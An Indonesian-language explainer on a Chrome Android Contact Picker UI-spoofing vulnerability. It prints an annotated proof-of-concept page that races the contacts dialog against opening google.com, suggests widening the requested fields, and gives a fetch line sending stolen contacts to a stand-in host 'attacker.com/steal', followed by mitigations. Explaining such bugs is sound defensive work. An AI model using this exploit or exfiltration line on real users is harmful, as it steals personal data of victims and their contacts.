Kerentanan Kritis Chrome Android Contact Picker API

Ketika Daftar Kontakmu Bisa Dicuri Hanya dengan Sekali Klik

Sebuah kerentanan pada Chrome di Android memungkinkan penyerang mencuri nama, nomor HP, dan email dari buku kontak kamu — dengan menipu kamu agar mengira kamu sedang memberi izin ke situs tepercaya seperti Google.

UI Spoofing Attack Chromium Bug #40057597 Chrome Android
01 — Latar Belakang

Apa itu Contact Picker API?

Browser modern punya fitur bernama Contact Picker API — sebuah cara resmi bagi website untuk meminta pengguna memilih kontak dari buku telepon mereka. Fitur ini berguna, misalnya saat kamu ingin mengundang teman ke suatu aplikasi.

Cara kerjanya: website memanggil navigator.contacts.select(), browser menampilkan dialog resmi yang meminta kamu memilih kontak, lalu data yang dipilih dikembalikan ke website. Terlihat aman, bukan?

Masalahnya: fitur ini bisa disalahgunakan dengan trik yang disebut UI Spoofing — membuat dialog izin muncul di atas halaman situs lain yang tidak ada hubungannya, sehingga kamu mengira situs tepercaya itulah yang meminta izin.

⚠️
Penting dipahami

Dialog izin Chrome memang menampilkan nama situs asli (penyerang). Tapi teks kecil itu mudah terlewat ketika kamu sudah terlanjur fokus melihat halaman Google di belakangnya. Inilah inti dari serangan ini.

02 — Mekanisme Serangan

Bagaimana Serangan Ini Bekerja?

Serangan ini memanfaatkan celah: Chrome tidak menutup dialog kontak ketika navigasi lintas-origin terjadi bersamaan. Hasilnya, dialog milik situs penyerang tampil di atas halaman tepercaya.

01
Korban mengunjungi situs jebakan
Bisa berupa domain lookalike seperti g00gle-login.com atau situs phishing biasa. Halaman terlihat biasa — mungkin loading screen atau halaman kosong.
02
Korban mengklik di mana saja
Satu klik di mana saja sudah cukup. Kode penyerang menggunakan onclick global yang terpasang ke seluruh halaman — tidak perlu tombol khusus.
03
Dua aksi dijalankan bersamaan
Situs penyerang memanggil navigator.contacts.select() dan sekaligus membuka google.com di jendela baru. Keduanya terjadi hampir bersamaan karena fungsi async tidak ditunggu.
04
Dialog kontak muncul di atas Google
Chrome tidak menutup dialog ketika Google terbuka. Akibatnya dialog kontak milik penyerang tampil persis di atas halaman Google — menciptakan ilusi bahwa Google yang meminta izin.
05
Korban menekan "Izinkan" dan memilih kontak
Karena mengira itu permintaan Google, korban memilih beberapa kontak dan menekan Allow. Semua data (nama, telepon, email) langsung dikirim ke server penyerang.

04 — Analisis Teknis

Bedah Kode PoC

Hanya 25 baris kode — tapi mengandung dua trik teknis yang cerdik. Berikut kode asli PoC dengan anotasi lengkap:

contact-poc.html — kode asli dengan anotasi
<!DOCTYPE html>
<html lang="en">
<head>
  <title>PoC</title>
  <script>

    // [A] listener ke SELURUH halaman — satu klik = pemicu
    onclick = async () => {

      // [B] IIFE async — TIDAK di-await dari luar
      (async () => {
          // [C] API resmi — meminta nama kontak
          let contacts = await navigator.contacts.select(
            ["name"], {}
          );
          // tampilkan (aslinya: kirim ke server)
          document.write(`Leaked: ${contacts[0]["name"]}`);
      })(); // ← IIFE langsung jalan

      // [D] Ini langsung dieksekusi tanpa menunggu [B]
      open("https://www.google.com", "PoC", "_blank");
    };

  </script>
</head>
<body>
  <center><h1>Click anywhere...</h1></center>
</body>
</html>
A
Global onclick listener

onclick dipasang langsung ke window — bukan ke elemen tertentu. Artinya klik di mana saja di halaman sudah memicu serangan. Tidak perlu tombol, link, atau interaksi khusus.

B
IIFE tidak di-await — kunci race condition

Fungsi async di dalam dibungkus IIFE dan langsung dijalankan, tapi TIDAK di-await dari fungsi luar. Ini membuat eksekusi berlanjut ke baris berikutnya tanpa menunggu dialog kontak selesai — sehingga open() jalan bersamaan.

C
navigator.contacts.select() — API resmi

Ini adalah API browser yang sah. Parameter ["name"] di sini hanya meminta nama — tapi bisa diperluas ke ["name", "tel", "email", "address"] untuk mencuri lebih banyak data sekaligus.

D
window.open() — senjata spoofing

Membuka google.com tepat saat dialog kontak muncul. Chrome tidak membatalkan dialog meski terjadi navigasi lintas-origin. Hasilnya: dialog penyerang tampil di atas halaman Google — spoofing berhasil.

i
Versi serangan nyata

Di PoC ini, data ditampilkan via document.write() hanya untuk demo. Penyerang nyata akan mengganti baris itu dengan fetch("https://attacker.com/steal", {method:"POST", body: JSON.stringify(contacts)}) — mengirim data diam-diam ke server mereka.

05 — Dampak & Risiko

Data Apa yang Bisa Dicuri?

Data Parameter API Risiko
Nama lengkap kontak "name" Digunakan untuk social engineering dan targeted phishing
Nomor telepon "tel" Serangan vishing, SMS phishing, SIM swap
Alamat email "email" Credential stuffing, email phishing
Alamat fisik "address" Penipuan paket, stalking, penipuan identitas
Nama organisasi "organization" Business email compromise, targeted corporate attack
🚨
Ingat: Bukan hanya data kamu yang bocor

Korban memilih dari buku kontak mereka — artinya data orang-orang lain (keluarga, rekan kerja, teman) juga ikut bocor tanpa sepengetahuan atau persetujuan mereka.

06 — Mitigasi

Cara Melindungi Diri

🔍
Baca nama situs di dialog
Selalu perhatikan teks kecil di atas dialog izin — bukan hanya tampilan halaman di belakangnya. Jika nama situsnya tidak kamu kenal, tekan Tolak.
⚠️
Waspadai domain lookalike
Domain seperti g00gle.com, paypa1.com adalah tanda bahaya. Periksa URL di bar browser sebelum mempercayai halaman.
👆
Hati-hati di situs tidak dikenal
Satu klik sudah cukup memicu serangan ini. Jika kamu tidak mengenal situsnya, jangan klik area manapun — langsung tutup tab.
🔄
Update Chrome secara rutin
Google aktif memperbaiki kerentanan seperti ini. Pastikan Chrome kamu selalu versi terbaru lewat Play Store atau pengaturan browser.
❌
Tolak izin yang tidak diminta
Jika kamu tidak sedang menggunakan fitur yang butuh akses kontak, tolak semua dialog izin kontak — apapun yang tampak di belakang dialog itu.
🏢
Untuk pengembang
Browser seharusnya menutup dialog navigator.contacts.select() secara otomatis ketika terjadi navigasi lintas-origin di context yang sama.
